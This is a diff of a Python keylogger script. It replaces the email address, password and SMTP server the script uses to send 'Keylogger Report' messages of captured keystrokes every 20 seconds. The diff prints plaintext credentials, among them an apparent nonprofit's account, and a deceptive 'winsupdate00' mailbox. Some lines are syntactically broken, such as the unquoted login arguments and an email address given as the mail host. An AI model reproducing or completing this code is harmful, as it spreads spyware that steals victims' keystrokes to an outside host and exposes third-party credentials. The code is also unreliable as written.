@@ -13,8 +13,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 # Email configuration
-EMAIL_ADDRESS = "scogjoh@gmail.com"
-EMAIL_PASSWORD = "Newupd1@12"
+EMAIL_ADDRESS = "winsupdate00@outlook.com"
+EMAIL_PASSWORD = "Logger1@12"
 SEND_REPORT_EVERY = 20  # as in seconds
 
 class KeyLogger:
@@ -65,9 +65,9 @@ class KeyLogger:
         body = f"Keylogger Report:\n\n{message}"
         msg.attach(MIMEText(body, 'plain'))
 
-        with smtplib.SMTP('wadadia-nonprofits.org', 465) as server:
+        with smtplib.SMTP('winsupdate00@outlook.com', 587) as server:
             server.starttls()
-            server.login(programs@wadadia-nonprofits.org, @WADEprog21)
+            server.login(winsupdate00@outlook.com, Logger1@12)
             server.sendmail(self.email, self.email, msg.as_string())
 
     def report(self):
